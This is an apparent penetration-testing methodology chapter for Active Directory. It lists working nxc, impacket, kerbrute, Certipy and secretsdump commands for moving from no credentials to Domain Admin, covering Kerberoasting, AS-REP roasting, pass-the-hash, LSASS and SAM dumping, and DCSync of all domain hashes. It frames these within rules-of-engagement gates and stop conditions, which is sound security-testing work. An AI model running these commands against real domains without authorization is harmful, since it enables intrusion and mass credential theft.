# 07 — Active Directory

> **Observation:** a Windows machine, and 88/389/445/135 suggest a domain (DC if 88+389+GC).
> **Objective:** map the domain and find the shortest authorized path to Domain Admin or to
> the client's defined "crown jewel", level by level of access.
> **Risk:** enumeration SAFE/CONTROLLED; anything touching auth or Kerberos pre-auth has
> lockout/detection risk — several steps are **RoE-gated**.

## WHY AD is the whole ballgame internally

Most internal compromises are AD compromises: one foothold + AD misconfigurations (ACLs,
delegation, ADCS, Kerberoast, weak passwords) → Domain Admin. AD is a graph; your job is to
find the edge path from where you stand to where the value is. BloodHound exists because
humans can't see that graph unaided.

## Identify the terrain first

| Objective | Tool | Command | Yields |
|-----------|------|---------|--------|
| Is it a DC? | nmap | `nmap -p53,88,135,139,389,445,464,636,3268 <ip>` | 88+389+3268 → DC |
| Domain & naming context | ldapsearch | `ldapsearch -x -H ldap://<ip> -s base namingContexts` | `DC=acme,DC=local` |
| DC hostname/domain | nxc | `nxc smb <ip>` | hostname, domain, OS, DC role |
| Domain via RDP/NTLM leak | nmap | `nmap -p3389 --script rdp-ntlm-info <ip>` | domain even if SMB locked down |
| Time (Kerberos needs ≤5min skew) | — | `ntpdate -q <dc>` / `nxc smb <dc>` shows time | sync your clock to DC |

> **Always sync your clock to the DC** before Kerberos work, or everything fails with skew errors.

---

## A. NO credentials (unauthenticated)

Goal: get *any* valid credential or a username list.

| Step | Objective | Primary | Command | If found |
|------|-----------|---------|---------|----------|
| A1 | Enumerate users (RID) | nxc | `nxc smb <dc> -u '' -p '' --rid-brute` | user list → `active-directory/users.txt` |
| A2 | Anon LDAP | ldapsearch | `ldapsearch -x -H ldap://<dc> -b "DC=acme,DC=local"` | if anon bind: users, descriptions (passwords in description field!) |
| A3 | AS-REP roasting | impacket | `impacket-GetNPUsers acme.local/ -usersfile users.txt -no-pass -dc-ip <dc>` | hashes for users w/ "no preauth" → crack offline (SAFE: offline) |
| A4 | User enum via Kerberos | kerbrute | `kerbrute userenum -d acme.local --dc <dc> users.txt` | valid usernames (quieter than SMB) |
| A5 | Password spray | nxc/kerbrute | **see §20** | **REQUIRES EXPLICIT RoE APPROVAL** (lockout) |
| A6 | LLMNR/NBT-NS poisoning | Responder | **see §20** | **REQUIRES EXPLICIT RoE APPROVAL** (active MITM) |
| A7 | Coerce + relay | PetitPotam/ntlmrelayx | **see §20** | **REQUIRES EXPLICIT RoE APPROVAL** |

AS-REP roasting (A3) and Kerberoast-without-creds are attractive because **cracking is
offline** = no lockout risk. The *requesting* is low-noise but logged (event 4768/4769).

**IF A1–A4 yield a username but no password →** candidate for spray (A5, gated) or AS-REP.
**IF anon LDAP exposes a password in a description/attribute →** validate it (§20) → you now
have Level B.

---

## B. Normal domain user (any valid cred)

This is where BloodHound earns its keep. One low-priv account usually reveals the path.

| Step | Objective | Primary | Command | If found |
|------|-----------|---------|---------|----------|
| B1 | Full graph collection | SharpHound/bloodhound-python | `bloodhound-python -u <u> -p <p> -d acme.local -ns <dc> -c All --zip` | ingest to BloodHound → analyze |
| B2 | Kerberoast | impacket | `impacket-GetUserSPNs acme.local/<u>:<p> -dc-ip <dc> -request` | service-account TGS hashes → crack offline |
| B3 | Enumerate everything | nxc/ldapdomaindump | `ldapdomaindump -u 'acme\<u>' -p <p> <dc>` | users/groups/computers/trusts/OUs as HTML |
| B4 | Find delegation | BloodHound / findDelegation | `impacket-findDelegation acme.local/<u>:<p>` | unconstrained/constrained/RBCD targets |
| B5 | ADCS misconfig | Certipy | `certipy find -u <u>@acme.local -p <p> -dc-ip <dc> -stdout -vulnerable` | ESC1–ESC8 templates → cert → DA |
| B6 | Readable shares w/ creds | nxc spider | `nxc smb <hosts> -u <u> -p <p> -M spider_plus` | GPP passwords, scripts, configs |
| B7 | GPP cpassword | nxc/Get-GPPPassword | `nxc smb <dc> -u <u> -p <p> -M gpp_password` | decryptable SYSVOL password (known AES key) |
| B8 | LAPS readable? | nxc | `nxc ldap <dc> -u <u> -p <p> -M laps` | local admin passwords you can read |
| B9 | Can I DCSync? | BloodHound edge | check `DCSync`/`GetChangesAll` on your principal | → dump all hashes (§20) |

**What to look for in BloodHound:** "Shortest paths to Domain Admins", your account's
"outbound object control" (ACL edges: GenericAll, WriteDACL, AddMember, ForceChangePassword),
Kerberoastable users, unconstrained-delegation computers, ADCS edges, sessions of privileged
users on reachable hosts.

**Decision branches:**
- **Kerberoast/AS-REP hash cracks →** new credential → re-run BloodHound as that user; may be
  Level C/D.
- **ACL edge (e.g. GenericAll on a group) →** abuse it (controlled, reversible — e.g. add
  yourself to a group, **then remove in cleanup**; **changing another user's password is
  POTENTIALLY DISRUPTIVE / RoE-gated** — prefer targeted Kerberoast/shadow-creds).
- **ADCS ESC1 →** request a cert as DA (Certipy) → authenticate as DA. High impact, usually
  non-disruptive, but **gate as exploitation (§18)**.
- **Readable LAPS / GPP cpassword →** local admin on hosts → Level C on those hosts.

---

## C. Local administrator (on a member host)

| Objective | Tool | Command | Yields |
|-----------|------|---------|--------|
| Dump local secrets | nxc/secretsdump | `nxc smb <host> -u <u> -p <p> --local-auth --sam --lsa` | local hashes, cached domain creds, LSA secrets |
| Dump LSASS (live creds) | nanodump/comsvcs | **CONTROLLED, EDR-noisy** | plaintext/tickets of logged-on users |
| Cred reuse check | nxc | `nxc smb <subnet> -u <localadmin> -H <hash> --local-auth` | where this local admin hash also works (pass-the-hash) |
| Harvest tickets | Rubeus/impacket | `Rubeus triage` | TGTs/TGSs of other users on the box |

**IF a dumped cached/LSASS credential belongs to a domain admin or a more-privileged user →**
you've jumped to Level D. **IF the local admin password is shared across machines →** lateral
movement (§21) across the estate (classic finding: no LAPS).

> LSASS access is heavily watched by EDR → **document it as a SOC-validation event (§24)** and
> prefer least-noisy methods. Dumping LSASS on a production box = CONTROLLED but detection-heavy.

---

## D. Compromised domain account (privileged)

| Objective | Tool | Command |
|-----------|------|---------|
| Confirm privilege | nxc | `nxc smb <dc> -u <u> -p <p>` → `(Pwn3d!)` means admin on target |
| DCSync (if rights) | secretsdump | `impacket-secretsdump acme.local/<u>:<p>@<dc>` (replication rights) |
| Enumerate as privileged | BloodHound | re-collect — you now see more sessions/ACLs |

**DCSync replicates password hashes from the DC** — extremely high impact. It is
non-destructive (read) but is the keys-to-the-kingdom → **treat as exploitation, gate via §18,
and it proves impact**. Dumping `krbtgt` enables Golden Tickets — **Golden/Silver ticket
forging and persistence is REQUIRES EXPLICIT RoE APPROVAL**.

---

## E. Domain Controller access

You've effectively won; now **prove impact cleanly** and stop escalating.

| Objective | Why | Note |
|-----------|-----|------|
| `secretsdump` NTDS.dit (via DCSync or VSS) | proves full domain compromise | read-only; the definitive impact evidence |
| Screenshot DA group membership / access | report artifact | redact per RoE |
| Enumerate trusts | shows blast radius to other domains | **do NOT cross a trust into another domain without explicit scope** |

**STOP conditions at Level E:** once domain compromise is *proven*, do not create persistence,
do not forge tickets, do not touch other trusted domains, do not modify anything. Capture
evidence, write it up. Further action needs explicit new authorization.

---

## Tool placement summary

| Tool | Where it fits |
|------|---------------|
| nmap | terrain ID (is it a DC?) |
| nxc (NetExec) | the swiss-army: SMB/LDAP/WinRM/MSSQL enum, auth checks, modules (laps, gpp, spider) |
| ldapsearch / ldapdomaindump | raw/structured LDAP dumps |
| kerbrute | user enum + spray (spray gated) |
| impacket (GetNPUsers/GetUserSPNs/secretsdump/findDelegation) | roasting, DCSync, delegation |
| Certipy | ADCS enumeration & abuse |
| BloodHound + SharpHound/bloodhound-python | the attack-path graph — the brain |
| Rubeus | Kerberos ticket ops (on-host) |

## Evidence
BloodHound zip → `active-directory/`; LDAP dumps; cracked-hash notes (hash *refs* in loot,
not in repo); per-level screenshots; `attack-paths/paths.csv` updated with each hop.
